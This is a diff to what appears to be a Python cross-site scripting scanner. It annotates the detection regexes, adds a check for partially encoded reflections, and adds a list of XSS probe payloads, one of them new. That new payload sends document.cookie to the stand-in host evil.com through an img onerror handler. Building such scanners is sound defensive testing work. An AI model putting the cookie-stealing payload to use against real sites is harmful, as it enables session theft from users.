@@ -69,7 +69,7 @@ def check_xss(html_content):
     vulnerabilities = []
     
     xss_patterns = [
-        r"<script.*?>.*?</script>",                 
+        r"<script.*?>.*?</script>",                   # Inline <script> tags
         r"<img\s+.*?src=['\"]?javascript:",           # JavaScript in image src
         r"on\w+\s*=",                                 # Inline event handlers
         r"<iframe.*?>",                               # Inline iframes
@@ -130,7 +130,8 @@ def test_reflected_xss(url):
         "<iframe src='javascript:alert(\"XSS\")'></iframe>",
         "<object data='javascript:alert(\"XSS\")'></object>",
         "<a href='javascript:alert(1)'>Click me</a>",
-        "%3Cscript%3Ealert(%27XSS%27)%3C/script%3E" 
+        "%3Cscript%3Ealert(%27XSS%27)%3C/script%3E",
+        "<img src=noimg onerror=location.href='//evil.com/cookie=' + document.cookie>" 
     ]
 
     parsed_url = urlparse(url)
@@ -174,6 +175,15 @@ def check_payload_in_response(test_url, payload):
                 "severity": "medium",
                 "description": f"Encoded payload '{encoded_payload}' was reflected, indicating weak sanitization.",
                 "recommendation": "Ensure all user inputs are fully sanitized and properly encoded."
+            })
+
+        partial_encoded_payload = payload.replace("<", "&lt;")
+        if partial_encoded_payload in test_response.text:
+            vulnerabilities.append({
+                "issue": "Partial encoding detected",
+                "severity": "medium",
+                "description": f"Payload partially encoded as '{partial_encoded_payload}', indicating bypass potential.",
+                "recommendation": "Apply full encoding or sanitization for all input values."
             })
 
     except requests.exceptions.RequestException as e:
